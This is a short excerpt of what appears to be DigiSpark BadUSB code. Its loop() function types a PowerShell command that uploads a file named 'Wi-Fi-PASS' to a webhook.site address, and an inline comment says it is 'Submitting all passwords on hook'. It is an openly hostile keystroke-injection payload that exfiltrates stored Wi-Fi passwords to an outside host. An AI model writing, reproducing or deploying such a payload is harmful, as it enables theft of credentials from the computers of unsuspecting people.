...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/8e00bd59-380e-49ca-af6f-2405bb5021ea -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
